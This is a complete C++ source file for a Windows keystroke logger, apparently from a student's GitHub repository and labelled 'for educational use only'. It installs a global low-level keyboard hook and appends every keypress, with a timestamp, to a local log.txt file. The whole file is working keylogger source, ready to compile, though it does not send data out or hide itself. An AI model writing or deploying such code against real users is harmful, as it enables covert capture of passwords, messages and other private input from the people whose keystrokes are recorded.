// Keystroke Logger 
// Designed to work directly with keystroke_analyzer.java/CLASS from the same GitHub Repository
// Created by: Leo Martinez III in Spring 2024

// ** FOR EDUCATIONAL USE ONLY **

#include <iostream>
#include <fstream>
#include <windows.h>
#include <chrono>
#include <ctime>

std::ofstream outputFile; // declare ofstream object for output file

void LogTime() {
    // get current time
    auto now = std::chrono::system_clock::now();
    std::time_t now_c = std::chrono::system_clock::to_time_t(now);

    // log current time/date
    outputFile << "\nTime and Date: " << std::ctime(&now_c) << std::endl;
}

// callback function for keyboard hook
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            KBDLLHOOKSTRUCT* pKeyInfo = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);

            // check the state of the Shift key
            bool shiftPressed = GetAsyncKeyState(VK_SHIFT) & 0x8000;

            // log current key
            char keyLogged = static_cast<char>(pKeyInfo->vkCode); // Does not take CAPS lock into consideration 
            if (shiftPressed) {
                // convert to uppercase if Shift is pressed
                keyLogged = toupper(keyLogged);
            } else {
                // convert to lowercase if Shift is not pressed
                keyLogged = tolower(keyLogged);
            }
            outputFile << "Key logged: " << keyLogged << std::endl;
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
    // open the output file in append mode (creates a new file if not already created)
    outputFile.open("log.txt", std::ios::app);
    if (!outputFile.is_open()) {
        std::cerr << "Failed to open log file" << std::endl;
        return 1;
    }

    // log time and date information
    LogTime();

    // set keyboard hook
    HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (hHook == NULL) {
        std::cerr << "Failed to set hook" << std::endl;
        outputFile.close(); // close the file before returning
        return 1;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // unhook keyboard hook
    UnhookWindowsHookEx(hHook);

    // close the output file before exiting
    outputFile.close();
    return 0;
}
